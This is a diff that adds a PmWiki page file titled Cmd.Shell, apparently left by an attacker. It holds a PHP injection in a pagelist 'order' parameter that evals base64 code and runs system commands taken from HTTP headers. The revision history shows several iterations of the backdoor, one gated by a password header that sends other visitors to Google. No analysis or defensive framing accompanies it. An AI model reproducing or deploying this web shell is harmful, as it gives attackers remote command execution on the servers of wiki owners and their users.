@@ -1,0 +1,74 @@
+version=pmwiki-2.1.27 ordered=1 urlencoded=1
+agent=Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5
+author=
+csum=
+ctime=1322072306
+host=203.147.36.35
+name=Cmd.Shell
+rev=21
+targets=
+text=(:pagelist order=']);print(eval(base64_decode(ZXJyb3JfcmVwb3J0aW5nKDApO3ByaW50KF9fU1RBUlRfXyk7aWYoQGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpe2VjaG8gQGV2YWwoYmFzZTY0X2RlY29kZShzdHJpcHNsYXNoZXMoJF9TRVJWRVJbSFRUUF9TSFpdKSkpO2VjaG8gQHN5c3RlbShiYXNlNjRfZGVjb2RlKHN0cmlwc2xhc2hlcygkX1NFUlZFUltIVFRQX1haXSkpKTt9ZWxzZXtlY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbSFRUUF9TSFpdKSk7ZWNobyBAc3lzdGVtKGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbSFRUUF9YWl0pKTt9)));die;#:)
+time=1322115013
+author:1322115013=
+diff:1322115013:1322114944:=
+host:1322115013=203.147.36.35
+author:1322114944=
+diff:1322114944:1322114918:=
+host:1322114944=203.147.36.35
+author:1322114918=
+diff:1322114918:1322114877:=
+host:1322114918=203.147.36.35
+author:1322114877=
+diff:1322114877:1322076473:=
+host:1322114877=203.147.36.35
+author:1322076473=
+diff:1322076473:1322076404:=
+host:1322076473=58.8.167.162
+author:1322076404=
+diff:1322076404:1322076249:=
+host:1322076404=58.8.167.162
+author:1322076249=
+diff:1322076249:1322076215:=
+host:1322076249=58.8.167.162
+author:1322076215=
+diff:1322076215:1322075987:=1c1%0a%3c (:pagelist order=']);print(eval(base64_decode(ZXJyb3JfcmVwb3J0aW5nKDApO3ByaW50KF9fU1RBUlRfXyk7aWYoQGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpe2VjaG8gQGV2YWwoYmFzZTY0X2RlY29kZShzdHJpcHNsYXNoZXMoJF9TRVJWRVJbSFRUUF9TSFpdKSkpO2VjaG8gQHN5c3RlbShiYXNlNjRfZGVjb2RlKHN0cmlwc2xhc2hlcygkX1NFUlZFUltIVFRQX1haXSkpKTt9ZWxzZXtlY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbSFRUUF9TSFpdKSk7ZWNobyBAc3lzdGVtKGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbSFRUUF9YWl0pKTt9)));die;#:)%0a\ No newline at end of file%0a---%0a> (:pagelist order=']);error_reporting(0);print(__START__);if(@get_magic_quotes_gpc()){echo @eval(base64_decode(stripslashes($_SERVER[HTTP_SHZ])));echo @system(base64_decode(stripslashes($_SERVER[HTTP_XZ])));}else{echo @eval(base64_decode($_SERVER[HTTP_SHZ]));echo @system(base64_decode($_SERVER[HTTP_XZ]));}die;#:)%0a\ No newline at end of file%0a
+host:1322076215=58.8.167.162
+author:1322075987=
+diff:1322075987:1322075842:=1c1%0a%3c (:pagelist order=']);error_reporting(0);print(__START__);if(@get_magic_quotes_gpc()){echo @eval(base64_decode(stripslashes($_SERVER[HTTP_SHZ])));echo @system(base64_decode(stripslashes($_SERVER[HTTP_XZ])));}else{echo @eval(base64_decode($_SERVER[HTTP_SHZ]));echo @system(base64_decode($_SERVER[HTTP_XZ]));}die;#:)%0a\ No newline at end of file%0a---%0a> (:pagelist order=']);print(eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApO0BpbmlfcmVzdG9yZSgic2FmZV9tb2RlIik7QGluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCkBpbmlfcmVzdG9yZSgic2FmZV9tb2RlX2luY2x1ZGVfZGlyIik7QGluaV9yZXN0b3JlKCJzYWZlX21vZGVfZXhlY19kaXIiKTsNCkBpbmlfcmVzdG9yZSgiZGlzYWJsZV9mdW5jdGlvbnMiKTsNCkBpbmlfcmVzdG9yZSgiYWxsb3dfdXJsX2ZvcGVuIik7DQoNCmluaV9zZXQoInNhZmVfbW9kZSIsIGZhbHNlKTsNCmluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIiKTsNCg0KQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7DQpAaW5pX3NldCgnbG9nX2Vycm9ycycsMCk7DQppZihpc3NldCgkX1NFUlZFUlsnSFRUUF9BVVRIRU4nXSkmJiRfU0VSVkVSWydIVFRQX0FVVEhFTiddPT0iUEBzc3cwcmQiKXtwcmludCAnX19TVEFSVF9fJzsNCmlmKEBnZXRfbWFnaWNfcXVvdGVzX2dwYygpKXtlY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfU0VSVkVSWydIVFRQX1NIWiddKSkpOw0KZWNobyBAc3lzdGVtKGJhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfU0VSVkVSWydIVFRQX1haJ10pKSk7fWVsc2V7DQplY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbJ0hUVFBfU0haJ10pKTtlY2hvIEBzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX1NFUlZFUlsnSFRUUF9YWiddKSk7fWV4aXQoKTsNCn1lbHNlDQogaGVhZGVyKCJMb2NhdGlvbjpodHRwOi8vd3d3Lmdvb2dsZS5jb20iKTs')));die;#:)%0a\ No newline at end of file%0a
+host:1322075987=58.8.167.162
+author:1322075842=
+diff:1322075842:1322075686:=1c1%0a%3c (:pagelist order=']);print(eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApO0BpbmlfcmVzdG9yZSgic2FmZV9tb2RlIik7QGluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCkBpbmlfcmVzdG9yZSgic2FmZV9tb2RlX2luY2x1ZGVfZGlyIik7QGluaV9yZXN0b3JlKCJzYWZlX21vZGVfZXhlY19kaXIiKTsNCkBpbmlfcmVzdG9yZSgiZGlzYWJsZV9mdW5jdGlvbnMiKTsNCkBpbmlfcmVzdG9yZSgiYWxsb3dfdXJsX2ZvcGVuIik7DQoNCmluaV9zZXQoInNhZmVfbW9kZSIsIGZhbHNlKTsNCmluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIiKTsNCg0KQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7DQpAaW5pX3NldCgnbG9nX2Vycm9ycycsMCk7DQppZihpc3NldCgkX1NFUlZFUlsnSFRUUF9BVVRIRU4nXSkmJiRfU0VSVkVSWydIVFRQX0FVVEhFTiddPT0iUEBzc3cwcmQiKXtwcmludCAnX19TVEFSVF9fJzsNCmlmKEBnZXRfbWFnaWNfcXVvdGVzX2dwYygpKXtlY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfU0VSVkVSWydIVFRQX1NIWiddKSkpOw0KZWNobyBAc3lzdGVtKGJhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfU0VSVkVSWydIVFRQX1haJ10pKSk7fWVsc2V7DQplY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbJ0hUVFBfU0haJ10pKTtlY2hvIEBzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX1NFUlZFUlsnSFRUUF9YWiddKSk7fWV4aXQoKTsNCn1lbHNlDQogaGVhZGVyKCJMb2NhdGlvbjpodHRwOi8vd3d3Lmdvb2dsZS5jb20iKTs')));die;#:)%0a\ No newline at end of file%0a---%0a> (:pagelist order=']);print(eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApO0BpbmlfcmVzdG9yZSgic2FmZV9tb2RlIik7QGluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCkBpbmlfcmVzdG9yZSgic2FmZV9tb2RlX2luY2x1ZGVfZGlyIik7QGluaV9yZXN0b3JlKCJzYWZlX21vZGVfZXhlY19kaXIiKTsNCkBpbmlfcmVzdG9yZSgiZGlzYWJsZV9mdW5jdGlvbnMiKTsNCkBpbmlfcmVzdG9yZSgiYWxsb3dfdXJsX2ZvcGVuIik7DQoNCmluaV9zZXQoInNhZmVfbW9kZSIsIGZhbHNlKTsNCmluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIiKTsNCg0KQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7DQpAaW5pX3NldCgnbG9nX2Vycm9ycycsMCk7DQppZihpc3NldCgkX1NFUlZFUlsnSFRUUF9BVVRIRU4nXSkmJiRfU0VSVkVSWydIVFRQX0FVVEhFTiddPT0iUEBzc3cwcmQiKXtwcmludCAnX19TVEFSVF9fJzsNCmlmKEBnZXRfbWFnaWNfcXVvdGVzX2dwYygpKXtlY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfU0VSVkVSWydIVFRQX1NIWiddKSkpOw0KZWNobyBAc3lzdGVtKGJhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfU0VSVkVSWydIVFRQX1haJ10pKSk7fWVsc2V7DQplY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbJ0hUVFBfU0haJ10pKTtlY2hvIEBzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX1NFUlZFUlsnSFRUUF9YWiddKSk7fWV4aXQoKTsNCn1lbHNlDQogaGVhZGVyKCJMb2NhdGlvbjpodHRwOi8vd3d3Lmdvb2dsZS5jb20iKTs=')));#:)%0a\ No newline at end of file%0a
+host:1322075842=58.8.167.162
+author:1322075686=
+diff:1322075686:1322075491:=1c1%0a%3c (:pagelist order=']);print(eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApO0BpbmlfcmVzdG9yZSgic2FmZV9tb2RlIik7QGluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCkBpbmlfcmVzdG9yZSgic2FmZV9tb2RlX2luY2x1ZGVfZGlyIik7QGluaV9yZXN0b3JlKCJzYWZlX21vZGVfZXhlY19kaXIiKTsNCkBpbmlfcmVzdG9yZSgiZGlzYWJsZV9mdW5jdGlvbnMiKTsNCkBpbmlfcmVzdG9yZSgiYWxsb3dfdXJsX2ZvcGVuIik7DQoNCmluaV9zZXQoInNhZmVfbW9kZSIsIGZhbHNlKTsNCmluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIiKTsNCg0KQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7DQpAaW5pX3NldCgnbG9nX2Vycm9ycycsMCk7DQppZihpc3NldCgkX1NFUlZFUlsnSFRUUF9BVVRIRU4nXSkmJiRfU0VSVkVSWydIVFRQX0FVVEhFTiddPT0iUEBzc3cwcmQiKXtwcmludCAnX19TVEFSVF9fJzsNCmlmKEBnZXRfbWFnaWNfcXVvdGVzX2dwYygpKXtlY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfU0VSVkVSWydIVFRQX1NIWiddKSkpOw0KZWNobyBAc3lzdGVtKGJhc2U2NF9kZWNvZGUoc3RyaXBzbGFzaGVzKCRfU0VSVkVSWydIVFRQX1haJ10pKSk7fWVsc2V7DQplY2hvIEBldmFsKGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbJ0hUVFBfU0haJ10pKTtlY2hvIEBzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX1NFUlZFUlsnSFRUUF9YWiddKSk7fWV4aXQoKTsNCn1lbHNlDQogaGVhZGVyKCJMb2NhdGlvbjpodHRwOi8vd3d3Lmdvb2dsZS5jb20iKTs=')));#:)%0a\ No newline at end of file%0a---%0a> (:pagelist order=']);error_reporting(0);print(__START__);eval(base64_decode($_SERVER[HTTP_SHZ]));die;#:)%0a\ No newline at end of file%0a
+host:1322075686=58.8.167.162
+author:1322075491=
+diff:1322075491:1322074966:=1c1%0a%3c (:pagelist order=']);error_reporting(0);print(__START__);eval(base64_decode($_SERVER[HTTP_SHZ]));die;#:)%0a\ No newline at end of file%0a---%0a> (:pagelist order=']);print(__START__);eval(base64_decode($_SERVER[SHZ]));die;#%0a\ No newline at end of file%0a
+host:1322075491=58.8.167.162
+author:1322074966=
+diff:1322074966:1322074776:=1c1%0a%3c (:pagelist order=']);print(__START__);eval(base64_decode($_SERVER[SHZ]));die;#%0a\ No newline at end of file%0a---%0a> (:pagelist order=']);error_reporting(0);print(__START__);eval(base64_decode($_SERVER[SHZ]));die;#%0a\ No newline at end of file%0a
+host:1322074966=58.8.167.162
+author:1322074776=
+diff:1322074776:1322074571:=1c1%0a%3c (:pagelist order=']);error_reporting(0);print(__START__);eval(base64_decode($_SERVER[SHZ]));die;#%0a\ No newline at end of file%0a---%0a> (:pagelist order=']);error_reporting(0);print(__START__);eval(base64_decode($_SERVER[SHZ]));#:)%0a\ No newline at end of file%0a
+host:1322074776=58.8.167.162
+author:1322074571=
+diff:1322074571:1322074409:=1c1%0a%3c (:pagelist order=']);error_reporting(0);print(__START__);eval(base64_decode($_SERVER[SHZ]));#:)%0a\ No newline at end of file%0a---%0a> (:pagelist order=']);error_reporting(0);eval(base64_decode($_SERVER[HTTP_CMD]));print(___);die;#:)%0a\ No newline at end of file%0a
+host:1322074571=58.8.167.162
+author:1322074409=
+diff:1322074409:1322073335:=
+host:1322074409=58.8.167.162
+author:1322073335=
+diff:1322073335:1322072374:=
+host:1322073335=58.8.167.162
+author:1322072374=
+diff:1322072374:1322072332:=
+host:1322072374=58.8.167.162
+author:1322072332=
+diff:1322072332:1322072322:=
+host:1322072332=58.8.167.162
+author:1322072322=
+diff:1322072322:1322072306:=
+host:1322072322=58.8.167.162
+author:1322072306=
+diff:1322072306:1322072306:=1d0%0a%3c (:pagelist order=']);error_reporting(0);eval(base64_decode($_SERVER[HTTP_CMD]));print(___);die;#:)%0a\ No newline at end of file%0a
+host:1322072306=58.8.167.162
